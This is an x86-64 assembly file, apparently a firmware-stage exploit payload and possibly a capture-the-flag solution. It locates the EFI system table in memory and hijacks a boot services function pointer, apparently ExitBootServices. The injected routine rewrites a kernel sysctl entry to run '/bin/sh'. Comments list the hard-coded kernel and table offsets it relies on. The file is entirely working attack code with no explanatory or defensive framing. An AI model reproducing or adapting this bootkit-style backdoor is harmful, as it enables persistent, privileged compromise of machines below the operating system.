    BITS 64
    DEFAULT REL

_start:
    push rax
    push rcx
    push rdx
    push rbx
    push rsp
    push rbp
    push rdi
    push rsi

    mov rax, 0x1e0ec018
    mov rdx, 0x5453595320494249
.find_system_services:
    cmp qword [rax], rdx
    je .found
    add rax, 0x100000
    jmp .find_system_services

.found:
    mov rax, qword [rax + 0x60]
    mov rdx, qword [rax + 0xe8]
    mov qword [rel original], rdx
    lea rdx, [rel backdoor]
    mov qword [rax + 0xe8], rdx

    pop rsi
    pop rdi
    pop rbp
    pop rsp
    pop rbx
    pop rdx
    pop rcx
    pop rax
    ret
original: dq 0
backdoor:
    push rax
    push rdx

    ;;; location of run_command sysctl structure
    mov rax, 0xc00000 + 0x1a0cb60
    ;;; virtual address of /bin/sh string
    mov rdx, 0xffffffff81ce8cc6
    mov qword [rax + 0x08], rdx

    pop rdx
    pop rax
    jmp qword [rel original]

; system table
; 0x1e5ec018
; 0x1e7ec018
; 0x1e7ec018
; 0x1e9ec018
; bzImage
; 0x15247ceb
; run_command string
; 0x28fcfdf
; kernel base
; 0x28fcfdf - 0x1cfcfdf
; = 0xc00000
; kern_table offset
; 0x1a0cb60
; sysctl_run_command offset
; 0x24a9360